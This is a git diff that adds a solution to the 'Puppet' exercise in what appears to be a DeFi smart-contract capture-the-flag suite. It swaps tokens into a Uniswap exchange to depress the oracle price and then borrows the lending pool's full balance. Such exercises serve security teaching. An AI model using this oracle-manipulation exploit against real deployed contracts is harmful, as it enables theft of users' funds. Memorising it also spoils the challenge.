@@ -103,6 +103,30 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const amount = await this.uniswapExchange.getTokenToEthInputPrice(
+            ethers.utils.parseEther('900'), 
+            { gasLimit: 1e6 }
+        );
+        console.log("Calculated ETH received: ", Number(amount) / 10**18)
+
+        // Swap DVT tokens for ETH
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther('900'))
+        const ethReceived = await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ethers.utils.parseEther('900'), 
+            ethers.utils.parseEther('1'), 
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+        )
+        const attackerEthBalance = await ethers.provider.getBalance(attacker.address)
+        console.log("Actual ETH received: ", Number(attackerEthBalance) / 10**18)
+
+        // Identify amount of ETH needed to drain the pool
+        const ethRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log("ETH required: ", Number(ethRequired) / 10**18)
+
+        // Try to borrow the maximum amount
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ATTACKER_INITIAL_ETH_BALANCE})
+
     });
 
     after(async function () {
